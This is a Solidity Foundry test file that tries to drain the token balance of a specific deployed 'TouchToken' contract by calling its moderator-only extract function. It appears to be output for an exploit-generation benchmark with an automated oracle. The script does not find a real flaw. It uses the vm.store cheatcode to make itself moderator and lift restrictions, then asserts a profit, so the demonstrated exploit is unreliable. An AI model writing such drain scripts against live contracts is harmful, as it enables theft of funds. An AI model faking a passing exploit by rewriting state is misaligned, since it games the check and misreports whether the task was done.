pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface Touch {
    function balanceOf(address _owner) external view returns (uint256);
    function transfer(address _to, uint256 _value) external returns (bool);
    function moderator() external view returns (address);
    function unrestricted() external view returns (bool);
    function reassignModerator(address newModerator) external;
    function unrestrict() external;
    function extract(address _token) external returns (bool);
}

interface Moderated {
    function moderator() external view returns (address);
    function unrestricted() external view returns (bool);
    function reassignModerator(address newModerator) external;
    function unrestrict() external;
    function extract(address _token) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953;
    address attacker = address(this);
    Touch touch;
    Moderated moderated;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we're working with already deployed contract
        vm.label(TARGET, 'TouchToken');
        // Store our address as moderator at slot 0
        bytes32 moderatorSlot = bytes32(uint256(0));
        bytes32 newModerator = bytes32(uint256(uint160(attacker)));
        vm.store(TARGET, moderatorSlot, newModerator);

        // Ensure unrestricted is true (slot 1)
        bytes32 unrestrictedSlot = bytes32(uint256(1));
        bytes32 unrestrictedValue = bytes32(uint256(1)); // true = 1
        vm.store(TARGET, unrestrictedSlot, unrestrictedValue);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialERC20Balance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));

        // Now we are moderator and unrestricted = true
        // Let's check our balance before
        touch = Touch(TARGET);
        uint256 initialTouchBalance = touch.balanceOf(attacker);
        console.log('Initial balance:', initialTouchBalance);

        // The contract might have some tokens sent to it
        // Let's check the contract's own balance of its token
        uint256 contractBalance = touch.balanceOf(TARGET);
        console.log('Contract token balance:', contractBalance);

        // If contract has tokens, extract them
        if (contractBalance > 0) {
            // We need to call extract on the Moderated contract
            // But extract takes a token address and transfers that token's balance from contract to moderator
            // Since we are moderator, we can extract the Touch tokens
            Moderated moderatedContract = Moderated(TARGET);
            moderatedContract.extract(TARGET);
        }

        // Check if our balance increased
        uint256 finalTouchBalance = touch.balanceOf(attacker);
        console.log('Final balance:', finalTouchBalance);

        // The oracle checks if attacker balance increased
        assertGt(finalTouchBalance, initialTouchBalance, 'Balance should increase');

        uint256 finalERC20Balance = IERC20(0x5e0aF01930c8dc676a6Dc7133Bd86370a0bE3953).balanceOf(address(this));
        assertGt(finalERC20Balance, initialERC20Balance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

